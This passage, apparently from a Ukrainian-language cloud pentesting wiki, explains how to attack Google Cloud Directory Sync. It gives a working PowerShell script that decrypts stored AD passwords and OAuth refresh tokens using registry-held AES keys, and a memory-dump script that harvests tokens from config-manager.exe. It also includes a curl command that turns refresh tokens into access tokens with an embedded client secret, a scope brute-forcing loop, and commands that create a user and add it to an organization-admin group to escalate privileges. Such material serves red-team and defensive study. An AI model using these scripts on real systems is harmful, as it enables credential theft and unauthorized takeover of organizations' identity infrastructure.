* **–°–ø—Ä–∞–≤–∞** –≤ Google Workspace Vault - —Ü–µ **–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä**, —è–∫–∏–π –æ—Ä–≥–∞–Ω—ñ–∑–æ–≤—É—î —Ç–∞ –≥—Ä—É–ø—É—î –≤—Å—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –ø–æ–≤'—è–∑–∞–Ω—É –∑ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—é —Å–ø—Ä–∞–≤–æ—é, —Ä–æ–∑—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è–º –∞–±–æ —é—Ä–∏–¥–∏—á–Ω–æ—é —Å–ø—Ä–∞–≤–æ—é. –í—ñ–Ω —Å–ª—É–≥—É—î —Ü–µ–Ω—Ç—Ä–∞–ª—å–Ω–∏–º –≤—É–∑–ª–æ–º –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è **–£—Ç—Ä–∏–º–∞–Ω–Ω—è–º–∏**, **–ü–æ—à—É–∫–∞–º–∏** —Ç–∞ **–ï–∫—Å–ø–æ—Ä—Ç–∞–º–∏**, —â–æ —Å—Ç–æ—Å—É—é—Ç—å—Å—è —Ü—ñ—î—ó –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó –ø—Ä–æ–±–ª–µ–º–∏.
* **–£—Ç—Ä–∏–º–∞–Ω–Ω—è** –≤ Google Workspace Vault - —Ü–µ **–¥—ñ—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è**, —â–æ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –¥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∞–±–æ –≥—Ä—É–ø, —â–æ–± **–∑–∞–ø–æ–±—ñ–≥—Ç–∏ –≤–∏–¥–∞–ª–µ–Ω–Ω—é –∞–±–æ –∑–º—ñ–Ω–∞–º** —ó—Ö–Ω—ñ—Ö –¥–∞–Ω–∏—Ö —É —Å–ª—É–∂–±–∞—Ö Google Workspace. –£—Ç—Ä–∏–º–∞–Ω–Ω—è –∑–∞–±–µ–∑–ø–µ—á—É—é—Ç—å –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Ç–∞ –Ω–µ–∑–º—ñ–Ω–Ω–æ—Å—Ç—ñ –ø—Ä–æ—Ç—è–≥–æ–º —Ç—Ä–∏–≤–∞–ª–æ—Å—Ç—ñ —é—Ä–∏–¥–∏—á–Ω–æ—ó —Å–ø—Ä–∞–≤–∏ –∞–±–æ —Ä–æ–∑—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
–ë—ñ–ª—å—à–µ [API –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫ —É –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

–¶–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –≤–∞—à–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –≥—Ä—É–ø –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É –∑ –≤–∞—à–∏–º Workspace** (–∞ –Ω–µ –Ω–∞–≤–ø–∞–∫–∏ –Ω–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è —Ü—å–æ–≥–æ —Ç–µ–∫—Å—Ç—É).

–¶–µ —Ü—ñ–∫–∞–≤–æ, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π –≤–∏–º–∞–≥–∞—Ç–∏–º–µ **–æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ Workspace —Ç–∞ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ AD**. –¢–æ–º—É, –º–æ–∂–ª–∏–≤–æ, –π–æ–≥–æ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ –¥–æ–º–µ–Ω—É, —è–∫–∏–π —á–∞—Å –≤—ñ–¥ —á–∞—Å—É —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤.

{% hint style="info" %}
–©–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ **MitM** –¥–ª—è –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É **`config-manager.exe`**, –ø—Ä–æ—Å—Ç–æ –¥–æ–¥–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ä—è–¥–æ–∫ —É —Ñ–∞–π–ª `config.manager.vmoptions`: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) –∑–¥–∞—Ç–Ω–∏–π –≤–∏—è–≤–∏—Ç–∏ **GCDS**, –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Ç–∞ **–Ω–∞–≤—ñ—Ç—å –ø–∞—Ä–æ–ª—ñ —Ç–∞ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**.
{% endhint %}

–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ GCDS –Ω–µ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—î –ø–∞—Ä–æ–ª—ñ –∑ AD –¥–æ Workspace. –Ø–∫—â–æ —â–æ—Å—å, –≤—ñ–Ω –ø—Ä–æ—Å—Ç–æ –∑–≥–µ–Ω–µ—Ä—É—î –≤–∏–ø–∞–¥–∫–æ–≤—ñ –ø–∞—Ä–æ–ª—ñ –¥–ª—è –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —É Workspace, —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—ñ:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - –î–∏—Å–∫ –¢–æ–∫–µ–Ω–∏ —Ç–∞ –û–±–ª—ñ–∫–æ–≤—ñ –î–∞–Ω—ñ AD

–ë—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `config-manager.exe` (–æ—Å–Ω–æ–≤–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª GCDS –∑ GUI) –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Active Directory, —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –¥–æ—Å—Ç—É–ø —É **xml —Ñ–∞–π–ª—ñ** –≤ –ø–∞–ø—Ü—ñ **`C:\Program Files\Google Cloud Directory Sync`** —É —Ñ–∞–π–ª—ñ –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **`Untitled-1.xml`** –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º. –•–æ—á–∞ –π–æ–≥–æ —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑–±–µ—Ä–µ–≥—Ç–∏ –≤ `Documents` –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ –≤ **–±—É–¥—å-—è–∫—ñ–π —ñ–Ω—à—ñ–π –ø–∞–ø—Ü—ñ**.

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —Ä–µ—î—Å—Ç—Ä **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª—é—á–∞ **`open.recent`** –º—ñ—Å—Ç–∏—Ç—å —à–ª—è—Ö–∏ –¥–æ –≤—Å—ñ—Ö –Ω–µ—â–æ–¥–∞–≤–Ω–æ –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ (xml). –¢–æ–º—É –º–æ–∂–ª–∏–≤–æ **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Ü–µ, —â–æ–± –∑–Ω–∞–π—Ç–∏ —ó—Ö**.

–ù–∞–π—Ü—ñ–∫–∞–≤—ñ—à–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É –±—É–¥–µ:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ **refresh** **token** —Ç–∞ **password** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ **—à–∏—Ñ—Ä—É—é—Ç—å—Å—è** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **AES CBC** –∑ –≤–∏–ø–∞–¥–∫–æ–≤–æ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–º –∫–ª—é—á–µ–º —Ç–∞ IV, —è–∫—ñ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** (–¥–µ –± –Ω–µ –∑–±–µ—Ä—ñ–≥–∞–ª–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ **`prefs`** Java –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è) —É —Ä—è–¥–∫–æ–≤–∏—Ö –∫–ª—é—á–∞—Ö **`/Encryption/Policy/V2.iv`** —Ç–∞ **`/Encryption/Policy/V2.key`**, –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö —É base64.

<details>

<summary>Powershell —Å–∫—Ä–∏–ø—Ç –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∫–∏ refresh token —Ç–∞ password</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, –ø–µ—Ä–µ–≥–ª—è–Ω—É–≤—à–∏ java-–∫–æ–¥ **`DirSync.jar`** –∑ **`C:\Program Files\Google Cloud Directory Sync`**, —à—É–∫–∞—é—á–∏ —Ä—è–¥–æ–∫ `exportkeys` (–æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –ø–∞—Ä–∞–º–µ—Ç—Ä cli, —è–∫–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `upgrade-config.exe` –æ—á—ñ–∫—É—î –¥–ª—è –≤–∏–≤–µ–¥–µ–Ω–Ω—è –∫–ª—é—á—ñ–≤).
{% endhint %}

–ó–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç–∞ PowerShell, —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º `-exportKeys` —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ **Key** —Ç–∞ **IV** –∑ —Ä–µ—î—Å—Ç—Ä—É –≤ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–º—É —Ñ–æ—Ä–º–∞—Ç—ñ, –∞ –ø–æ—Ç—ñ–º –ø—Ä–æ—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ CyberChef –∑ AES/CBC —Ç–∞ —Ü–∏–º –∫–ª—é—á–µ–º —ñ IV –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∫–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.

### GCDS - –í–∏–≤–µ–¥–µ–Ω–Ω—è —Ç–æ–∫–µ–Ω—ñ–≤ –∑ –ø–∞–º'—è—Ç—ñ

–¢–∞–∫ —Å–∞–º–æ, —è–∫ —ñ –∑ GCPW, –º–æ–∂–ª–∏–≤–æ –≤–∏–≤–µ—Å—Ç–∏ –ø–∞–º'—è—Ç—å –ø—Ä–æ—Ü–µ—Å—É `config-manager.exe` (—Ü–µ –Ω–∞–∑–≤–∞ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É GCDS –∑ GUI), —ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –¥–æ—Å—Ç—É–ø—É (—è–∫—â–æ –≤–æ–Ω–∏ –≤–∂–µ –±—É–ª–∏ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω—ñ).\
–ì–∞–¥–∞—é, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–≥–ª–∏ –± –∑–Ω–∞–π—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ AD.

<details>

<summary>–í–∏–≤–µ–¥–µ–Ω–Ω—è –ø—Ä–æ—Ü–µ—Å—ñ–≤ config-manager.exe —Ç–∞ –ø–æ—à—É–∫ —Ç–æ–∫–µ–Ω—ñ–≤</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è —Ç–æ–∫–µ–Ω—ñ–≤ –¥–æ—Å—Ç—É–ø—É –∑ —Ç–æ–∫–µ–Ω—ñ–≤ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è, –º–æ–∂–Ω–∞ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –¥–æ—Å—Ç—É–ø—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –π–æ–≥–æ —Ç–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∫–ª—ñ—î–Ω—Ç–∞ —ñ —Å–µ–∫—Ä–µ—Ç –∫–ª—ñ—î–Ω—Ç–∞, –∑–∞–∑–Ω–∞—á–µ–Ω—ñ –≤ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π –∫–æ–º–∞–Ω–¥—ñ:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Scopes

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –Ω–∞–≤—ñ—Ç—å –º–∞—é—á–∏ refresh token, –Ω–µ–º–æ–∂–ª–∏–≤–æ –∑–∞–ø–∏—Ç–∞—Ç–∏ –∂–æ–¥–µ–Ω scope –¥–ª—è access token, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ –ª–∏—à–µ **scopes, –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ –¥–æ–¥–∞—Ç–∫–æ–º, –≤ —è–∫–æ–º—É –≤–∏ –≥–µ–Ω–µ—Ä—É—î—Ç–µ access token**.

–¢–∞–∫–æ–∂ refresh token –Ω–µ —î –¥—ñ–π—Å–Ω–∏–º —É –∫–æ–∂–Ω–æ–º—É –¥–æ–¥–∞—Ç–∫—É.
{% endhint %}

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º GCSD –Ω–µ –º–∞—Ç–∏–º–µ –¥–æ—Å—Ç—É–ø—É —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –¥–æ –∫–æ–∂–Ω–æ–≥–æ –º–æ–∂–ª–∏–≤–æ–≥–æ OAuth scope, —Ç–æ–º—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç, –º–∏ –º–æ–∂–µ–º–æ –∑–Ω–∞–π—Ç–∏ scopes, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ `refresh_token` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó `access_token`:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

–Ü –æ—Å—å –≤–∏—Ö—ñ–¥, —è–∫–∏–π —è –æ—Ç—Ä–∏–º–∞–≤ –Ω–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### –°—Ç–≤–æ—Ä—ñ—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –¥–æ–¥–∞–π—Ç–µ –π–æ–≥–æ –¥–æ –≥—Ä—É–ø–∏ `gcp-organization-admins`, —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –µ—Å–∫–∞–ª—É–≤–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –≤ GCP
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
